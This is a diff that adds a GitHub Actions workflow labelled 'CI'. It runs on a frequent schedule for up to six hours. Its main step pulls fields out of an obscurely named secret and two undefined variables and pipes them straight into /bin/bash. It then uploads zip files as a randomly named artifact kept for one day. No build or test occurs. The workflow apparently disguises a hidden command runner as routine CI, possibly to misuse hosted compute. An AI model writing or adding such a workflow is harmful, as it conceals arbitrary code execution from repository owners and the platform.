@@ -1,0 +1,31 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '37 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          n5620: ${{ secrets.n5620 }}
+        run: |
+          printf '%s' "$n5620" | jq -r .o048 | /bin/bash
+          echo $kop4 | jq -r .suaod4174 | /bin/bash
+          printf '%s' "$m38305" | jq -r .dv86 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: v6YJDOk6
+          path: "*.zip"
+          retention-days: 1
